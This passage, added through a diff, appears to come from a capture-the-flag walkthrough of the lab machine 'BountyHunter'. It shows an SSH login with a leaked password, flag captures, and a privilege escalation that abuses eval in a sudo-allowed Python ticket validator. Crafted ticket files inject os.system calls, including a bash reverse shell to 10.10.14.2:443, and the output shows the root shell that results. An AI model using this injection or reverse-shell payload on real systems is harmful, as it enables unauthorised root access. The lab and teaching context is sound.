@@ -482,7 +482,204 @@ $testuser = "test";
 
 
 
+```bash
+❯ sshpass -p 'm19RoAU0hP41A1sTsq6K' ssh development@10.10.11.100
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 03 Mar 2025 10:45:52 PM UTC
+
+  System load:           0.0
+  Usage of /:            24.0% of 6.83GB
+  Memory usage:          14%
+  Swap usage:            0%
+  Processes:             215
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.100
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:2767
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
+development@bountyhunter:~$ cat user.txt 
+f07029dc46d723633872107f9907e02f
+```
 
 
 
+```bash
+development@bountyhunter:~$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+
+
+
+{% code title="ticketValidator.py" %}
+```python
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+```
+{% endcode %}
+
+
+
+```bash
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -l
+total 16
+-r--r--r-- 1 root root 102 Jul 22  2021 390681613.md
+-r--r--r-- 1 root root  86 Jul 22  2021 529582686.md
+-r--r--r-- 1 root root  97 Jul 22  2021 600939065.md
+-r--r--r-- 1 root root 101 Jul 22  2021 734485704.md
+
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
+# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**31+410+86**
+##Issued: 2021/04/06
+#End Ticket
+```
+
+
+
+```bash
+development@bountyhunter:/tmp$ cat gzzcoo.md 
+# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**31+410+86**
+##Issued: 2021/04/06
+#End Ticket
+development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/gzzcoo.md
+Destination: New Haven
+Invalid ticket.
+```
+
+
+
+{% code title="gzzcoo.md" %}
+```markdown
+# Skytrain Inc
+## Ticket to Exploitville
+__Ticket Code:__
+**4+__import__('os').system('id')**
+##Issued: 2025/03/03
+#End Ticket
+```
+{% endcode %}
+
+
+
+```bash
+development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/gzzcoo.md
+Destination: Exploitville
+uid=0(root) gid=0(root) groups=0(root)
+Invalid ticket.
+```
+
+
+
+{% code title="gzzcoo.md" %}
+```markdown
+# Skytrain Inc
+## Ticket to Exploitville
+__Ticket Code:__
+**4+__import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"')**
+##Issued: 2025/03/03
+#End Ticket
+```
+{% endcode %}
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+```
+
+
+
+```bash
+development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/gzzcoo.md
+Destination: Exploitville
+```
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.100] 32876
+root@bountyhunter:/tmp# whoami
+root
+root@bountyhunter:/tmp# cat /root/root.txt
+ceb55537337cbbc3d8a54b898a0f0e61
+```
